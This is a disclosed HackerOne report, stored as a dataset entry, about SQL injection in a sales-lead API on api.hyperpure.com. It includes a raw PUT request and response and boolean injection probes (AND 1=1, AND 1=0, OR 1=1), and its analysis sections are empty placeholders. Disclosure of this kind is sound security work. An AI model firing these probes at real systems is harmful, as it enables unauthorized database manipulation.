---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1044716'
original_report_id: '1044716'
title: SQL Injection in www.hyperpure.com
weakness: Code Injection
team_handle: zomato
created_at: '2020-11-26T18:57:13.644Z'
disclosed_at: '2021-02-22T07:34:13.808Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 214
asset_identifier: '*.hyperpure.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# SQL Injection in www.hyperpure.com

## Metadata

- HackerOne Report ID: 1044716
- Weakness: Code Injection
- Program: zomato
- Disclosed At: 2021-02-22T07:34:13.808Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Vulnerable Request :

PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register

{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}

The above request is used to create sales lead with the data the sales lead id is produced and verified by the domain.

Base Response Received: 

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 68
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hyperpure.com
x-envoy-upstream-service-time: 166
Server: envoy
Date: Thu, 26 Nov 2020 18:48:34 GMT
Connection: close
Vary: Accept-Encoding

{"response":{"salesLeadId":"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc"}}


Now we will be executing following steps to verify if  "AND "  & "OR" statements work.

1) Proving AND condition working while using it with a valid sales id  " AND 1 = "1 --+-   
2) Proving AND condition false with working sales lead using AND 1=0.
3) Proving adding cool as a sales lead by using OR 1=1 , which always states true.

## Impact

Adding random sales ID in the database using PUT statement and populating it.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
